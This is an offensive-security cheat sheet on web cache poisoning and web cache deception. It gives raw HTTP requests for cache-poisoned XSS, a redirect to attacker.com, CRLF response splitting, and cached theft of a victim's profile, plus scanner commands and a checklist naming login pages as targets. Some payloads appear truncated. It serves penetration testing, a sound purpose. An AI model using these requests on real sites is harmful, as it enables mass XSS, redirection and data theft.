Web Cache Poisoning

Web cache poisoning exploits the gap between what a cache considers a "cache key" and what the back-end server actually processes. An attacker finds an unkeyed input (a header, parameter, or cookie that the back-end reflects but the cache ignores when deciding whether to store a response), injects a malicious payload into it, and forces that poisoned response into the cache. Every subsequent user who requests the same URL receives the attacker's payload without sending the unkeyed input themselves.

Core Concepts

# Cache key — what the cache uses to identify a unique response:
# Typically: method + path + query string + (sometimes) Host header
# Everything NOT in the key is "unkeyed"

# Unkeyed inputs that commonly exist:
# - X-Forwarded-Host / X-Forwarded-Scheme / X-Forwarded-Proto
# - X-Original-URL / X-Rewrite-URL
# - X-HTTP-Method-Override
# - Arbitrary headers that CDNs strip before caching
# - Unkeyed query parameters (e.g., tracking params like utm_source)
# - Unkeyed cookies or request body values

# Attack phases:
# 1. Discover an unkeyed input that the back-end reflects in the response
# 2. Inject a payload via that input
# 3. Poison the cache (ensure the poisoned response gets stored)
# 4. Every cache hit delivers the payload to other users

Detection — Finding Unkeyed Inputs

# Param Miner (Burp extension — best tool for this):
# Right-click request → Extensions → Param Miner → Guess headers
# Param Miner sends requests with common unkeyed headers and compares responses
# A reflected header that doesn't change the cache key = unkeyed input

# Manual approach — send header, check if it appears in response body:
GET /en?region=uk HTTP/1.1
Host: target.com
X-Forwarded-Host: canary12345.com
# If response contains "canary12345.com" → X-Forwarded-Host is unkeyed

# Confirm it's cached — send again without the header:
GET /en?region=uk HTTP/1.1
Host: target.com
# If response still contains "canary12345.com" → poisoned and cached

# Useful cache behavior indicators:
# - X-Cache: HIT — response came from cache
# - X-Cache: MISS — response came from origin, may now be stored
# - Age: N — seconds since response was cached
# - CF-Cache-Status: HIT/MISS (Cloudflare)
# - Cache-Control: no-store — response will NOT be cached (abort)

XSS via Cache Poisoning

# Inject XSS payload via unkeyed X-Forwarded-Host header:
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a.">"

# If the server reflects X-Forwarded-Host in the response HTML, e.g.:
# <link rel="canonical" href="//a.">"/en?region=uk">
# → XSS payload is now in the cached response for /en?region=uk

# Other reflection points to check:
# - Meta refresh / Open Graph tags (og:url, og:image)
# - Absolute URL redirects (Location header)
# - JSON-LD schema markup
# - Script src attributes

# Via X-Forwarded-Scheme to trigger redirect:
GET /en?region=uk HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps
# If server redirects http→https using this header, attacker controls Location

# Combined attack (redirect + XSS):
GET /en?region=uk HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
# Response: Location: https://attacker.com/en?region=uk
# If cached → all users visiting /en?region=uk get redirected to attacker.com

Unkeyed Query Parameters

# Some caches ignore certain query parameters (UTM params, analytics):
# Target caches /search?q=test regardless of utm_source, utm_campaign, etc.

# Test: does changing utm_source change the cache key?
GET /search?q=test&utm_source=canary1 HTTP/1.1
# X-Cache: MISS (first request — stored)

GET /search?q=test&utm_source=canary2 HTTP/1.1
# X-Cache: HIT (cache ignored utm_source — it's unkeyed)

# If the page reflects utm_source in the response (e.g., as a JS variable):
GET /search?q=test&utm_source= HTTP/1.1
# Poisoned response gets cached for ALL /search?q=test requests
# Regardless of what utm_source the victim sends

# Fat GET attack — add body to a GET request:
GET /search?q=test HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

param=xss
# If back-end processes GET body but cache ignores it → unkeyed body

Cache Poisoning via HTTP Response Splitting

# If an unkeyed header is reflected in a response header value (not body),
# CRLF injection may allow injecting a full second HTTP response

GET /redirect?url=https://target.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: target.com

# The cache stores the injected response and serves it for subsequent requests

Web Cache Deception

# DIFFERENT attack — trick the cache into storing authenticated content:
# Normal cache: /profile is private (no-store), /static/logo.png is public (cached)

# Attack: /profile/nonexistent.css
GET /profile/nonexistent.css HTTP/1.1
Cookie: session=VICTIM_TOKEN
# Server falls back to /profile (serves the user's private data)
# Cache sees .css extension → assumes it's static → stores the response
# Attacker GETs /profile/nonexistent.css (no cookie) → gets victim's profile data

# Common file extensions that trick caches into storing:
# .css, .js, .jpg, .png, .gif, .svg, .woff, .ico

# Mitigation: cache should use Cache-Control from response, not file extension

Automated Scanning

# Web Cache Vulnerability Scanner (wcvs):
# https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
wcvs -u https://target.com
wcvs -u https://target.com -H "Cookie: session=TOKEN"
wcvs -u https://target.com --proxy http://127.0.0.1:8080

# Param Miner (Burp extension):
# BApp Store → Param Miner → install
# Right-click any request → Extensions → Param Miner → Guess headers
# Also: Guess params, Guess cookies
# Identifies unkeyed inputs automatically

# Arjun — hidden parameter discovery:
# https://github.com/s0md3v/Arjun
python3 arjun.py -u https://target.com --get
python3 arjun.py -u https://target.com --post
# Finds unkeyed GET/POST params by comparing response changes

# ParamSpider — mine params from web archives:
# https://github.com/devanshbatham/ParamSpider
python3 paramspider.py --domain target.com
# Outputs all parameters seen in URLs from Wayback Machine

Cache Buster Technique

# When testing, always use a cache buster to avoid poisoning real users:
# Add a unique parameter to make each test request its own cache entry

GET /en?region=uk&cb=12345 HTTP/1.1
Host: target.com
X-Forwarded-Host: canary.attacker.com

# Change cb= for each test request
# Once confirmed vulnerable, remove the cache buster for the real poison
# This is essential — without a cache buster you may serve your test payload
# to all users while still in the testing phase

Exploitation Checklist

# 1. Identify cacheable pages (static pages, product pages, landing pages)
# 2. Add cache buster (?cb=RANDOM) to all test requests
# 3. Run Param Miner to find unkeyed headers and parameters
# 4. For each unkeyed input:
#    a. Inject a canary value, verify it's reflected in the response
#    b. Remove the cache buster, verify canary appears in the cached response
#    c. Make a clean request (no custom headers) and confirm cache hit with canary
# 5. Replace canary with XSS payload or redirect payload
# 6. Confirm the payload is served to unauthenticated requests
# 7. Report impact (XSS to all users, credential theft, etc.)

# High-value targets for cache poisoning:
# - Site-wide JavaScript includes (poisons all pages)
# - Login page (credential theft at scale)
# - Product/landing pages with high traffic
# - CDN-cached API responses
